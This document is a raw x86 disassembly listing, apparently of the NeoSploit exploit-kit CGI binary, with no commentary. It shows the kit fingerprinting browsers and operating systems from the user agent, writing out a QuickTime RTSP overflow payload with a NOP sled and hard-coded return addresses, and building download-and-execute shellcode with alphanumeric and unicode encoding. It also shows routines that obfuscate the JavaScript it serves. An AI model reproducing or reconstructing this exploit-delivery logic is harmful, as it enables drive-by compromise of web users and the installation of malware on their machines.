mov ecx, 0x10
mov edi, ebx
mov dword [tmp2], 0
rep stosd dword es:[edi], eax
push str.HTTP_USER_AGENT
call sym.imp.getenv
mov dword [ebx + 0x24], eax
mov dword [esp], str.QUERY_STRING
call sym.imp.getenv
mov dword [ebx + 0x10], eax
mov dword [esp], str.REQUEST_METHOD
call sym.imp.getenv
mov dword [ebx + 0x14], eax
mov dword [esp], str.REMOTE_USER
call sym.imp.getenv
mov dword [ebx + 0x18], eax
mov dword [esp], str.SERVER_NAME
call sym.imp.getenv
mov dword [ebx + 0x1c], eax
mov dword [esp], str.REQUEST_URI
call sym.imp.getenv
mov dword [ebx + 0x28], eax
mov dword [esp], str.REMOTE_ADDR
call sym.imp.getenv
mov dword [ebx + 0x20], eax
mov dword [esp], str.HTTP_COOKIE
call sym.imp.getenv
mov dword [ebx + 0x2c], eax
mov dword [esp], str.SCRIPT_NAME
call sym.imp.getenv
mov dword [ebx + 0x30], eax
mov dword [esp], str.HTTP_REFERER
call sym.imp.getenv
mov dword [ebx + 0x34], eax
mov dword [esp], str.CONTENT_LENGTH
call sym.imp.getenv
mov esi, eax
add esp, 0x10
xor eax, eax
test esi, esi
je 0x804a442
sub esp, 0xc
push esi
call sym.imp.atol
add esp, 0x10
sub esp, 0xc
mov dword [ebx + 0x38], eax
push str.SERVER_PORT
call sym.imp.getenv
mov esi, eax
add esp, 0x10
test esi, esi
mov eax, 0x50
je 0x804a46c
sub esp, 0xc
push esi
call sym.imp.atoi
add esp, 0x10
mov dword [ebx + 0x3c], eax
mov eax, dword [ebx + 0x20]
test eax, eax
je 0x804a648
mov eax, dword [ebx + 0x1c]
test eax, eax
je 0x804a488
mov eax, dword [ebx + 0x28]
test eax, eax
jne 0x804a4bc
sub esp, 0xc
mov eax, dword [arg_ch]
push dword [eax]
call dbg.xstrdup
mov dword [ebx + 0x30], eax
mov dword [esp], 0
call sym.imp.time
mov dword [esp], eax
call sym.imp.srand
lea esp, [var_ch]
pop ebx
pop esi
mov eax, 1
pop edi
leave
ret
lea esi, [esi]
mov eax, dword [ebx + 0x20]
test eax, eax
je 0x804a488
mov edi, dword [ebx + 0x30]
test edi, edi
je 0x804a488
mov eax, dword [ebx + 0x34]
test eax, eax
mov dword [ebx + 8], 1
jne 0x804a6d8
mov eax, dword [ebx + 0x24]
xor esi, esi
test eax, eax
je 0x804a536
xor edi, edi
nop
sub esp, 8
lea eax, [edi + str.windows_95]
push eax
push dword [ebx + 0x24]
call dbg.stristr
add esp, 0x10
test eax, eax
jne 0x804a6ed
sub esp, 8
lea eax, [edi + str.win_95]
push eax
push dword [ebx + 0x24]
call dbg.stristr
add esp, 0x10
test eax, eax
jne 0x804a6ed
inc esi
add edi, 0x34
cmp esi, 6
ja 0x804a6f5
mov eax, dword [ebx + 0x24]
test eax, eax
jne 0x804a4e8
cmp byte [ebx], 0
jne 0x804a53e
mov byte [ebx], 8
xor esi, esi
test eax, eax
je 0x804a57d
lea eax, [esi + esi*8]
lea edi, [eax*4]
sub esp, 8
lea ecx, [edi + str.msie]
push ecx
push dword [ebx + 0x24]
mov dword [var_40h], ecx
call dbg.stristr
add esp, 0x10
test eax, eax
mov edx, eax
jne 0x804a707
inc esi
cmp esi, 3
ja 0x804a57d
mov ecx, dword [ebx + 0x24]
test ecx, ecx
jne 0x804a544
cmp byte [ebx + 1], 0
jne 0x804a58d
mov byte [ebx + 1], 5
mov word [ebx + 2], 0
sub esp, 0xc
push dword [ebx + 0x28]
call sym.imp.strdup
sub esp, 8
push 0x3f
push eax
mov esi, eax
call sym.imp.strrchr
add esp, 0x20
test eax, eax
je 0x804a5af
mov byte [eax], 0
xor edx, edx
mov al, dl
cld
mov edi, esi
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
mov dword [var_5ch], ecx
mov edi, dword [ebx + 0x1c]
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
mov eax, dword [var_5ch]
sub esp, 0xc
lea ecx, [ecx + eax + 0x1e]
push ecx
call sym.imp.malloc
mov dword [ebx + 0xc], eax
mov eax, dword [ebx + 0x3c]
add esp, 0x10
cmp eax, 0x50
je 0x804a600
sub esp, 8
push eax
push 0x804e2d9
call dbg.ntoa
mov dword [tmp2], eax
add esp, 0x10
mov eax, dword [tmp2]
sub esp, 0xc
test eax, eax
push esi
je 0x804a6fd
push eax
push dword [ebx + 0x1c]
push str.http:___s_s_s
push dword [ebx + 0xc]
call sym.imp.sprintf
add esp, 0x14
push esi
call sym.imp.free
pop eax
pop edx
push 0
mov eax, dword [ebx + 0x34]
test eax, eax
jne 0x804a639
mov eax, 0x804e2eb
push eax
call dbg.Crc32Str
mov dword [ebx + 4], eax
jmp 0x804a498
nop
sub esp, 0xc
push 0x804e2ee
call sym.imp.strdup
mov dword [ebx + 0x14], eax
mov dword [esp], str.192.168.2.102
call sym.imp.strdup
mov dword [ebx + 0x20], eax
mov dword [esp], str.server.com
call sym.imp.strdup
mov dword [ebx + 0x1c], eax
mov dword [esp], str._cgi_bin_neosploit.exe
call sym.imp.strdup
mov dword [ebx + 0x28], eax
mov dword [esp], str.Mozilla_4.0__compatible__Windows_NT_5.1__Firefox_2003_
call sym.imp.strdup
mov dword [ebx + 0x24], eax
mov dword [esp], str.Mozilla_4.0__compatible__Windows_NT_5.1__Opera_9.20_
call sym.imp.strdup
mov dword [ebx + 0x24], eax
mov dword [esp], str._cgi_bin_neosploit.exe
call sym.imp.strdup
mov dword [ebx + 0x30], eax
mov dword [esp], str.puser1
call sym.imp.strdup
mov dword [ebx + 0x10], eax
mov dword [esp], str.http:__192.168.80.1_cgi_bin_neosploit_neosploit.exe
call sym.imp.strdup
add esp, 0x10
mov dword [ebx + 0x34], eax
jmp 0x804a47a
cmp byte [eax], 0
jne 0x804a4dc
mov dword [ebx + 0x34], 0
jmp 0x804a4dc
mov eax, dword [edi + obj.os_list]
mov byte [ebx], al
mov eax, dword [ebx + 0x24]
jmp 0x804a536
mov eax, 0x804e01f
jmp 0x804a60f
mov eax, dword [edi + obj.browser_list]
mov byte [ebx + 1], al
cld
xor eax, eax
mov edi, dword [var_40h]
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
sub esp, 0xc
lea ecx, [ecx + edx - 1]
push ecx
call sym.imp.strdup
mov dword [ver], eax
mov cl, byte [eax]
add esp, 0x10
test cl, cl
mov edx, eax
je 0x804a7e8
lea eax, [ecx - 0x41]
cmp al, 0x19
mov esi, ecx
jbe 0x804a774
lea eax, [ecx - 0x61]
cmp al, 0x19
jbe 0x804a774
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x804a774
inc edx
movzx esi, byte [edx]
mov eax, esi
test al, al
je 0x804a774
lea eax, [esi - 0x41]
cmp al, 0x19
jbe 0x804a774
lea eax, [esi - 0x61]
cmp al, 0x19
jbe 0x804a774
lea eax, [esi - 0x30]
cmp al, 9
ja 0x804a755
mov dword [real_ver], edx
lea eax, [esi - 0x41]
cmp al, 0x19
ja 0x804a7a8
mov eax, esi
cmp al, 0x2e
lea edi, [edx + 1]
je 0x804a790
mov edx, edi
movzx esi, byte [edi]
jmp 0x804a777
mov esi, esi
sub esp, 8
lea edi, [edx + 1]
push edi
push edx
call sym.imp.strcpy
add esp, 0x10
mov edx, edi
movzx esi, byte [edi]
jmp 0x804a777
nop
lea eax, [esi - 0x61]
cmp al, 0x19
jbe 0x804a77e
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x804a77e
mov ecx, esi
cmp cl, 0x2e
je 0x804a790
sub esp, 0xc
push dword [real_ver]
call sym.imp.atoi
add esp, 0x10
cmp byte [ebx + 1], 2
mov word [ebx + 2], ax
je 0x804a7ed
sub esp, 0xc
push dword [ver]
call sym.imp.free
add esp, 0x10
jmp 0x804a57d
movzx esi, byte [eax]
jmp 0x804a774
movzx eax, ax
push esi
push eax
push 0x804e32a
lea edi, [str_num]
push edi
call sym.imp.sprintf
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea esi, [ecx - 1]
add esp, 0x10
cmp esi, 3
jg 0x804a7d5
mov dx, word [ebx + 2]
movzx eax, dx
lea eax, [eax + eax*4]
inc esi
shl eax, 1
cmp esi, 3
mov edx, eax
jle 0x804a81b
mov word [ebx + 2], ax
jmp 0x804a7d5
push ebp
mov ebp, esp
mov ecx, dword [arg_8h]
mov dl, byte [ecx]
test dl, dl
je 0x804d583
lea eax, [edx - 0x41]
cmp al, 0x19
ja 0x804d57c
add edx, 0x20
mov byte [ecx], dl
inc ecx
mov dl, byte [ecx]
test dl, dl
jne 0x804d570
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov ebx, dword [arg_8h]
xor esi, esi
test ebx, ebx
mov dword [count], 0
je 0x804b7a0
mov edi, dword [size]
test edi, edi
je 0x804b7a0
mov ecx, dword [ret_str_lngt]
test ecx, ecx
je 0x804b7a0
mov edx, dword [size]
sub esp, 0xc
lea eax, [edx*4 + 1]
push eax
call dbg.xmalloc
add esp, 0x10
test eax, eax
mov dword [outbuf1], eax
je 0x804b7b6
mov dword [eax], 0
push dword [size]
push eax
push ebx
call dbg.js_convert
add esp, 0xc
inc eax
je 0x804b7c0
cmp esi, dword [size]
mov dword [i], 0
jmp 0x804b77d
mov esi, esi
mov ecx, dword [i]
mov edx, dword [outbuf1]
mov eax, dword [edx + ecx*4]
test eax, eax
je 0x804b77f
push edx
push eax
push 0x804eda8
lea ecx, [single_wide_char]
push ecx
call sym.imp.sprintf
lea edi, [single_wide_char]
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
mov eax, dword [count]
lea ebx, [ecx - 1]
pop ecx
pop edi
lea edi, [eax + ebx + 1]
push edi
push esi
call dbg.xrealloc
add esp, 0x10
test eax, eax
mov esi, eax
je 0x804b7c0
mov edx, dword [count]
mov byte [eax + edx], bl
lea eax, [eax + edx + 1]
push edx
push ebx
lea ecx, [single_wide_char]
push ecx
push eax
call sym.imp.memcpy
inc dword [i]
mov eax, dword [size]
add esp, 0x10
mov dword [count], edi
cmp dword [i], eax
jb 0x804b710
mov edx, dword [count]
mov ecx, dword [ret_str_lngt]
sub esp, 0xc
mov dword [ecx], edx
push dword [outbuf1]
call sym.imp.free
add esp, 0x10
lea esp, [var_ch]
pop ebx
mov eax, esi
pop esi
pop edi
leave
ret
nop
sub esp, 0xc
push dword [ret_str_lngt]
push dword [size]
push ebx
push str.js_crypter_html_to_wchar__p___d___p_
push 6
call dbg.seterror
lea esp, [var_ch]
pop ebx
pop esi
xor eax, eax
pop edi
leave
ret
sub esp, 0xc
push dword [outbuf1]
call sym.imp.free
add esp, 0x10
test esi, esi
je 0x804b7b6
sub esp, 0xc
push esi
call sym.imp.free
add esp, 0x10
jmp 0x804b7b6
push ebp
mov ebp, esp
mov eax, dword [obj.last_errno]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov dword [dest], obj.my_vars
mov dword [var_14h], 0
jmp 0x804b283
lea esi, [esi]
and edx, 0xfffffffc
sub eax, edx
lea edi, [eax + 5]
call sym.imp.random
cdq
mov ecx, 0x16
idiv ecx
mov esi, edx
lea ebx, [edx + 0x41]
call sym.imp.random
test al, 1
mov edx, ebx
je 0x804b23c
lea edx, [esi + 0x61]
sub esp, 0xc
mov eax, dword [var_14h]
push edi
mov byte [eax + obj.my_vars], dl
call dbg.js_crypter_rand_hex
add esp, 0x10
test eax, eax
je 0x804b299
sub esp, 8
push 0xa000
push 9
call dbg.strrand
pop esi
pop edi
push eax
push dword [dest]
call sym.imp.strcpy
add dword [dest], 0x20
add esp, 0x10
add dword [var_14h], 0x20
cmp dword [dest], 0x8056420
ja 0x804b294
call sym.imp.random
test eax, eax
mov edx, eax
jns 0x804b214
lea edx, [eax + 3]
jmp 0x804b214
nop
mov eax, 1
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2a74
mov edi, dword [arg_10h]
push edi
push 0x804ed8a
mov esi, dword [arg_8h]
mov dword [ebp - 0x2a68], 0
mov dword [ebp - 0x2a64], 0
mov dword [ebp - 0x2a5c], 0
mov dword [ebp - 0x2a6c], 0x804e06c
call dbg.ntoa
add esp, 0xc
push 0x2a40
push 0x90
mov ebx, eax
lea eax, [ebp - 0x2a58]
push eax
call sym.imp.memset
mov dl, byte [esi + 1]
lea eax, [edx - 1]
add esp, 0x10
cmp al, 1
ja 0x8049192
mov dword [ebp - 0x2a64], 0xc0c0c0c
mov eax, dword [new_exploit]
test eax, eax
jne 0x8049238
mov ebx, dword [ebp - 0x2a64]
test ebx, ebx
jne 0x80493b1
push dword [obj.__stdoutp]
push 5
push 1
push str._____n
call sym.imp.fwrite
mov eax, dword [ebp - 0x2a68]
add esp, 0x10
test eax, eax
je 0x804918a
sub esp, 0xc
push dword [ebp - 0x2a68]
call sym.imp.free
add esp, 0x10
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
lea eax, [edx - 3]
cmp al, 1
ja 0x804913f
cmp byte [esi], 6
jne 0x804913f
push edi
push dword [username]
push 6
push esi
push 0x40000000
movzx eax, byte [obj.main_shellode_sep]
push eax
lea eax, [ebp - 0x2a5c]
push eax
push obj.main_shellcode
mov dword [ebp - 0x2a5c], 0xca
call dbg.shellcode_down_exec
add esp, 0x1c
push dword [ebp - 0x2a5c]
mov dword [ebp - 0x2a68], eax
push dword [ebp - 0x2a68]
lea eax, [ebp - 0x2990]
push eax
call sym.imp.memcpy
mov al, byte [ebx]
add esp, 0x10
cmp al, 0x36
jne 0x8049203
mov dword [ebp - 0x2a64], 0x66802a9e
mov al, byte [ebx]
cmp al, 0x37
jne 0x804913f
cmp byte [ebx + 1], 0x30
je 0x80495c8
cmp byte [ebx + 1], 0x31
jg 0x804913f
cmp byte [ebx + 2], 0x33
jg 0x804913f
mov dword [ebp - 0x2a64], 0x668013c2
jmp 0x804913f
cmp byte [esi + 1], 2
je 0x804941d
mov ecx, dword [ebp - 0x2a64]
test ecx, ecx
jne 0x804942e
sub esp, 8
push 0
push str.video_quicktime
call dbg.print_headers
pop eax
pop edx
push 0xa000
push 0xa
call dbg.strrand
add esp, 0xc
push eax
push str.NEW
push str.__xml_version_1.0_____quicktime_type_application_x_quicktime_media_link____embed_autoplay_true__moviename_NEW__qtnext_YEAR__type_video_quicktime__src_rtsp:__
call dbg.strreplace
pop ecx
mov ebx, eax
pop eax
push 0xa000
push 0x17
call dbg.strrand
add esp, 0xc
push eax
push str.rtsp:__
push ebx
call dbg.strreplace
add esp, 0x10
test ebx, ebx
mov dword [ebp - 0x2a6c], eax
je 0x80492b8
sub esp, 0xc
push ebx
call sym.imp.free
add esp, 0x10
push obj.exp_chrome_is_decoded
push 0x837f9d
push 0x33f
push obj.exp_chrome
call dbg.decode_data
push edi
push dword [username]
push 4
push esi
call dbg.create_exec_url
add esp, 0x1c
push eax
push str.__DOWNLOAD_URL__
push obj.exp_chrome
mov edi, eax
call dbg.strreplace
mov esi, eax
pop eax
pop edx
push 0x4000
push 6
call dbg.strrand
add esp, 0xc
push eax
push str.__SAVE_TO__
push esi
call dbg.strreplace
add esp, 0x10
test esi, esi
mov ebx, eax
je 0x8049326
sub esp, 0xc
push esi
call sym.imp.free
add esp, 0x10
test edi, edi
mov esi, ebx
je 0x8049338
sub esp, 0xc
push edi
call sym.imp.free
add esp, 0x10
push edi
push ebx
push str.YEAR
push dword [ebp - 0x2a6c]
call dbg.strreplace
mov ebx, eax
push dword [obj.__stdoutp]
xor eax, eax
cld
mov ecx, 0xffffffff
mov edi, ebx
repne scasb al, byte es:[edi]
not ecx
dec ecx
push ecx
push 1
push ebx
call sym.imp.fwrite
mov ecx, dword [ebp - 0x2a6c]
add esp, 0x20
test ecx, ecx
je 0x8049388
sub esp, 0xc
push dword [ebp - 0x2a6c]
call sym.imp.free
add esp, 0x10
test esi, esi
je 0x8049398
sub esp, 0xc
push esi
call sym.imp.free
add esp, 0x10
test ebx, ebx
je 0x8049158
sub esp, 0xc
push ebx
call sym.imp.free
add esp, 0x10
jmp 0x8049158
sub esp, 8
push 0
push str.video_quicktime
call dbg.print_headers
mov eax, dword [ebp - 0x2a64]
push dword [obj.__stdoutp]
mov dword [var_20h], eax
mov dword [var_1ch], eax
cld
mov byte [var_348h], 0x3a
xor eax, eax
mov edi, dword [ebp - 0x2a6c]
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
dec ecx
push ecx
push 1
push str.__xml_version_1.0_____quicktime_type_application_x_quicktime_media_link____embed_autoplay_true__moviename_NEW__qtnext_YEAR__type_video_quicktime__src_rtsp:__
call sym.imp.fwrite
add esp, 0x20
push dword [obj.__stdoutp]
push 0x2a40
push 1
lea eax, [ebp - 0x2a58]
push eax
call sym.imp.fwrite
add esp, 0x10
jmp 0x8049158
cmp word [esi + 2], 0x7d6
jbe 0x8049250
jmp 0x8049242
sub esp, 8
push 0
push str.video_quicktime
mov byte [ebp - 0x2a5d], 0x90
call dbg.print_headers
pop eax
pop edx
push 0xa000
push 0xa
call dbg.strrand
add esp, 0xc
push eax
push str.NEW
push str.__xml_version_1.0_____quicktime_type_application_x_quicktime_media_link____embed_autoplay_true__moviename_NEW__qtnext_YEAR__type_video_quicktime__src_rtsp:__
call dbg.strreplace
pop esi
pop edi
push 0xa000
push 0xa
mov ebx, eax
call dbg.strrand
add esp, 0xc
push eax
push str.YEAR
push ebx
call dbg.strreplace
add esp, 0x10
test ebx, ebx
mov dword [ebp - 0x2a6c], eax
je 0x804949d
sub esp, 0xc
push ebx
call sym.imp.free
add esp, 0x10
sub esp, 8
push dword [ebp - 0x2a6c]
push dword [obj.__stdoutp]
call sym.imp.fprintf
mov ecx, dword [ebp - 0x2a68]
add esp, 0x10
test ecx, ecx
je 0x8049598
lea edi, [ebp - 0x2a5d]
mov ebx, 0xc7
lea esi, [esi]
push dword [obj.__stdoutp]
push 1
push 1
push edi
call sym.imp.fwrite
add esp, 0x10
dec ebx
jns 0x80494d0
push dword [obj.__stdoutp]
push dword [ebp - 0x2a5c]
push 1
push dword [ebp - 0x2a68]
call sym.imp.fwrite
mov ebx, 3
add esp, 0x10
push dword [obj.__stdoutp]
push 1
push 1
push edi
call sym.imp.fwrite
add esp, 0x10
dec ebx
jns 0x8049507
sub esp, 8
push dword [obj.__stdoutp]
push 0x3a
call sym.imp.fputc
mov ebx, 0x326
add esp, 0x10
lea esi, [esi]
push dword [obj.__stdoutp]
push 1
push 1
push edi
call sym.imp.fwrite
add esp, 0x10
dec ebx
jns 0x8049538
push dword [obj.__stdoutp]
push 1
push 4
lea ebx, [ebp - 0x2a64]
push ebx
call sym.imp.fwrite
push dword [obj.__stdoutp]
push 1
push 4
push ebx
call sym.imp.fwrite
mov edx, dword [ebp - 0x2a6c]
add esp, 0x20
test edx, edx
je 0x8049158
sub esp, 0xc
push dword [ebp - 0x2a6c]
call sym.imp.free
jmp 0x80493a9
push dword [obj.__stdoutp]
push 8
push 1
sub esp, 0xc
push 0xa000
push 0xa
call dbg.strrand
add esp, 0x14
push eax
call sym.imp.fwrite
lea edi, [ebp - 0x2a5d]
add esp, 0x10
jmp 0x804951d
mov al, byte [ebx + 2]
sub eax, 0x32
cmp al, 1
ja 0x8049215
mov dword [ebp - 0x2a64], 0x66801382
jmp 0x804913f
push ebp
mov ebp, esp
push edi
push ebx
cmp byte [show_headers], 0
jne 0x804bdec
mov edi, dword [buf]
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
mov ebx, ecx
not ebx
sub esp, 0xc
lea eax, [ebx + 0xb]
push eax
call dbg.xmalloc
add esp, 0x10
test eax, eax
mov edi, eax
mov dword [obj.tmp_vars_count], 0
je 0x804bdc4
sub esp, 8
mov dword [eax], 0x65742f3c
mov dword [eax + 4], 0x72617478
mov dword [eax + 8], 0x3e6165
push dword [buf]
push eax
call sym.imp.strcat
add esp, 0xc
push 0
lea eax, [ebx + 0xa]
push eax
push edi
call dbg.js_crypter_encode
mov ebx, eax
mov dword [esp], edi
call sym.imp.free
add esp, 0x10
test ebx, ebx
mov edi, ebx
je 0x804bdc4
xor eax, eax
test edi, edi
setne al
lea esp, [var_8h]
pop ebx
pop edi
leave
ret
nop
sub esp, 0x10
call dbg.geterror
pop ebx
pop edx
push eax
push str.error:__s_n
call sym.imp.printf
add esp, 0x10
xor eax, eax
test edi, edi
setne al
lea esp, [var_8h]
pop ebx
pop edi
leave
ret
mov esi, esi
sub esp, 8
push 0
push str.text_html
call dbg.print_headers
add esp, 0x10
jmp 0x804bd43
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x40
mov esi, dword [arg_ch]
test esi, esi
mov ebx, dword [arg_8h]
jne 0x804d280
sub esp, 0xc
test ebx, ebx
mov eax, 0x804e01d
je 0x804d2a0
test ebx, ebx
push eax
mov eax, ebx
je 0x804d2ac
test ebx, ebx
push eax
mov eax, str.Content_Type:_
je 0x804d2bc
test esi, esi
push eax
mov eax, 0x804e01f
je 0x804d264
lea eax, [content_len]
push eax
push str.Expires:_Mon__26_Jul_1997_05:00:00_GMT_nCache_Control:_post_check0__pre_check0_nPragma:_no_cache_n_s_s_s_s
call sym.imp.printf
mov dword [obj.header_printed], 1
lea esp, [var_8h]
pop ebx
pop esi
leave
ret
push eax
push esi
push str.Content_Length:__d_n
lea eax, [content_len]
push eax
call sym.imp.sprintf
add esp, 0x10
sub esp, 0xc
test ebx, ebx
mov eax, 0x804e01d
jne 0x804d246
nop
mov eax, 0x804e01f
test ebx, ebx
push eax
mov eax, ebx
jne 0x804d24d
mov eax, 0x804e01f
test ebx, ebx
push eax
mov eax, str.Content_Type:_
jne 0x804d257
nop
mov eax, 0x804e01f
jmp 0x804d257
push ebp
mov ebp, esp
sub esp, 8
mov edx, dword [arg_8h]
xor ecx, ecx
test edx, edx
mov al, byte [arg_ch]
je 0x804d6fc
sub esp, 8
movsx eax, al
push eax
push edx
call sym.imp.strchr
add esp, 0x10
xor ecx, ecx
test eax, eax
je 0x804d6fc
inc eax
mov dl, byte [eax]
cmp dl, 0x20
je 0x804d6ec
xor ecx, ecx
test dl, dl
je 0x804d6fc
mov ecx, eax
mov eax, ecx
leave
ret
jmp dword [reloc.strchr]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x12c
call sym.imp.random
sub esp, 0xc
push 0x100
call dbg.xmalloc
mov byte [eax], 0
add esp, 0x10
cmp dword [obj.tmp_vars_count], 0xf
mov esi, eax
ja 0x804b3b0
sub esp, 0xc
push 5
call dbg.js_crypter_rand_hex
mov edi, eax
call sym.imp.random
cdq
mov ecx, 0x16
idiv ecx
mov dword [var_11ch], edx
add esp, 0x10
mov ebx, edx
call sym.imp.random
add ebx, 0x41
test al, 1
mov edx, ebx
jne 0x804b444
sub esp, 8
mov byte [edi], dl
lea ecx, [h2]
push edi
push ecx
call sym.imp.strcpy
call sym.imp.random
test eax, eax
mov edx, eax
js 0x804b46e
and edx, 0xfffffc00
sub eax, edx
push eax
lea eax, [h2]
push eax
push str.var__s_ld_
push esi
call sym.imp.sprintf
add esp, 0x18
lea edx, [h2]
push edx
mov eax, dword [obj.tmp_vars_count]
shl eax, 5
add eax, obj.tmp_vars
push eax
call sym.imp.strcpy
mov edi, dword [obj.tmp_vars_count]
inc edi
add esp, 0x10
cmp edi, 1
mov dword [obj.tmp_vars_count], edi
ja 0x804b3eb
nop
sub esp, 8
lea eax, [h2]
push eax
push esi
call sym.imp.strcat
call sym.imp.random
mov edx, 5
mov ecx, edx
cdq
idiv ecx
add esp, 0x10
cmp edx, 4
ja case.default.0x804b3a7
jmp dword [edx*4 + 0x804ed0c]
mov esi, esi
call sym.imp.random
test eax, eax
mov edx, eax
js 0x804b524
and edx, 0xfffffff0
sub eax, edx
shl eax, 5
sub esp, 8
lea edi, [eax + obj.tmp_vars]
push edi
lea ecx, [h2]
push ecx
call sym.imp.strcpy
mov edi, dword [obj.tmp_vars_count]
add esp, 0x10
cmp edi, 1
jbe 0x804b37c
xor edx, edx
mov ecx, 3
mov eax, edi
div ecx
xor ebx, ebx
cmp ebx, edx
mov dword [var_120h], edx
jae 0x804b37c
cmp ebx, edi
jae 0x804b37c
mov eax, ebx
shl eax, 5
sub esp, 8
add eax, obj.tmp_vars
push eax
push esi
call sym.imp.strcat
call sym.imp.random
mov edx, 5
mov ecx, edx
cdq
idiv ecx
add esp, 0x10
cmp edx, 4
ja case.default.0x804b43d
jmp dword [edx*4 + 0x804ed20]
mov edx, dword [var_11ch]
add edx, 0x61
sub esp, 8
mov byte [edi], dl
lea ecx, [h2]
push edi
push ecx
call sym.imp.strcpy
call sym.imp.random
test eax, eax
mov edx, eax
jns 0x804b32e
lea edx, [eax + 0x3ff]
jmp 0x804b32e
sub esp, 0xc
push 5
call dbg.js_crypter_rand_hex
add esp, 0xc
push eax
push str._s
cld
xor eax, eax
mov ecx, 0xffffffff
mov edi, esi
repne scasb al, byte es:[edi]
not ecx
lea ecx, [ecx + esi - 1]
push ecx
call sym.imp.sprintf
add esp, 0x10
mov edi, esi
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
mov word [ecx + esi - 1], 0x3b
lea esp, [var_ch]
pop ebx
mov eax, esi
pop esi
pop edi
leave
ret
sub esp, 0xc
push 5
call dbg.js_crypter_rand_hex
add esp, 0xc
push eax
push str._s
lea esi, [esi]
cld
xor eax, eax
mov ecx, 0xffffffff
mov edi, esi
repne scasb al, byte es:[edi]
not ecx
lea ecx, [ecx + esi - 1]
push ecx
call sym.imp.sprintf
add esp, 0x10
xor eax, eax
cld
mov ecx, 0xffffffff
mov edi, esi
repne scasb al, byte es:[edi]
not ecx
mov word [ecx + esi - 1], 0x3b
inc ebx
cmp ebx, dword [var_120h]
jae 0x804b37c
cmp ebx, dword [obj.tmp_vars_count]
jmp 0x804b408
lea edx, [eax + 0xf]
jmp 0x804b3bf
sub esp, 0x10
call sym.imp.random
add esp, 0xc
test eax, eax
mov edx, eax
js 0x804b668
and edx, 0xfffffc00
sub eax, edx
push eax
push str.__ld
jmp 0x804b48c
sub esp, 0x10
call sym.imp.random
add esp, 0xc
test eax, eax
mov edx, eax
js 0x804b673
and edx, 0xfffffc00
sub eax, edx
push eax
push str._ld
jmp 0x804b48c
sub esp, 0xc
push 5
call dbg.js_crypter_rand_hex
add esp, 0xc
push eax
push str..toString__.indexOf__s_
jmp 0x804b48c
mov edi, esi
cld
xor eax, eax
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
dec ecx
mov dword [esi + ecx], 0x536f742e
mov dword [esi + ecx + 4], 0x6e697274
mov dword [esi + ecx + 8], 0x292867
mov edi, esi
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
mov word [ecx + esi - 1], 0x3b
lea esp, [var_ch]
pop ebx
mov eax, esi
pop esi
pop edi
leave
ret
sub esp, 0x10
call sym.imp.random
add esp, 0xc
test eax, eax
mov edx, eax
js 0x804b686
and edx, 0xfffffc00
sub eax, edx
push eax
push str.__ld
jmp 0x804b4dc
cld
mov ecx, 0xffffffff
xor eax, eax
mov edi, esi
repne scasb al, byte es:[edi]
not ecx
dec ecx
mov dword [esi + ecx], 0x536f742e
mov dword [esi + ecx + 4], 0x6e697274
mov dword [esi + ecx + 8], 0x292867
jmp case.default.0x804b43d
sub esp, 0x10
call sym.imp.random
add esp, 0xc
test eax, eax
mov edx, eax
js 0x804b67e
and edx, 0xfffffc00
sub eax, edx
push eax
push str._ld
jmp 0x804b4dc
sub esp, 0xc
push 5
call dbg.js_crypter_rand_hex
add esp, 0xc
push eax
push str..toString__.indexOf__s_
jmp 0x804b4dc
lea edx, [eax + 0x3ff]
jmp 0x804b541
lea edx, [eax + 0x3ff]
jmp 0x804b569
lea edx, [eax + 0x3ff]
jmp 0x804b63d
lea edx, [eax + 0x3ff]
jmp 0x804b5ee
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov edi, dword [arg_ch]
mov bl, byte [arg_10h]
push dword [additional]
push dword [username]
movzx eax, byte [exploit]
push eax
push dword [penv]
movzx ebx, bl
call dbg.create_exec_url
push ebx
push eax
push edi
push dword [shellcode]
call dbg.shellcode_add_url
add esp, 0x20
test dword [format], 0x40000000
mov ebx, eax
jne 0x804d1e4
mov ecx, dword [format]
test ecx, ecx
js 0x804d204
lea esp, [var_ch]
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
nop
sub esp, 8
push edi
push eax
call dbg.shellcode_encode_alphanum
mov dword [esp], ebx
mov esi, eax
call sym.imp.free
mov ecx, dword [format]
add esp, 0x10
test ecx, ecx
mov ebx, esi
jns 0x804d1d9
sub esp, 8
push edi
push ebx
call dbg.shellcode_to_unicode
mov esi, eax
mov dword [esp], ebx
call sym.imp.free
mov ebx, esi
add esp, 0x10
lea esp, [var_ch]
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 0xc
movzx eax, byte [c]
push eax
mov ebx, dword [s]
push ebx
call sym.imp.strchr
mov edx, eax
add esp, 0x10
test edx, edx
mov eax, 0xffffffff
je 0x804d4b3
mov eax, edx
sub eax, ebx
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov edi, dword [arg_8h]
test edi, edi
mov esi, dword [arg_ch]
je 0x804db03
test esi, esi
jne 0x804db1c
push esi
push edi
push str.xstrndup__p___d_
push 6
call dbg.seterror
lea esp, [var_ch]
pop ebx
pop esi
xor eax, eax
pop edi
leave
ret
nop
sub esp, 0xc
